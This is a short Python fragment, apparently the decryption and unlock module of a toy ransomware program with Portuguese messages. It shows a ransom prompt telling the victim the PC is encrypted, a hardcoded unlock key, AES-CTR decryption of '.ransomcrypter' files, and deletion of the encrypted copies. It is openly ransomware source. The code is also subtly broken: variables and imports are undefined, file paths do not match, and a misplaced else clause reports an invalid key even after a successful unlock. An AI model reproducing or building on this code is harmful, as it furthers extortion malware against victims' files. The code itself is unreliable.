def descrypt(decrypt_file):
    try:
        for file in glob.glob('*.ransomcrypter'):

            keybytes = decrypt_file.encode()
            name_file = open(file, 'rb')
            file_data = name_file.read()
            dkey = keybytes  # 16 bytes key - change for your key
            daes = pyaes.AESModeOfOperationCTR(dkey)
            decrypt_data = daes.decrypt(file_data)

            format_file = file.split('.')
            new_file_name = format_file[0] + '.' + format_file[1]  # Path to drop file

            dnew_file = open(f'{desktop}\\{new_file_name}', 'wb')
            dnew_file.write(decrypt_data)
            dnew_file.close()
    except ValueError as err:
        print('Chave inválida')

if __name__ == '__main__':
    key = input('Seu PC foi criptografado informe a chave  para liberar os arquivos:')
    if key == '1ab2c3e4f5g6h7i8':
        descrypt(key)
        for del_file in glob.glob('*.ransomcrypter'):
            os.remove(f'{desktop}\\{del_file}')
        else:
            print('Chave de liberação inválida!!!')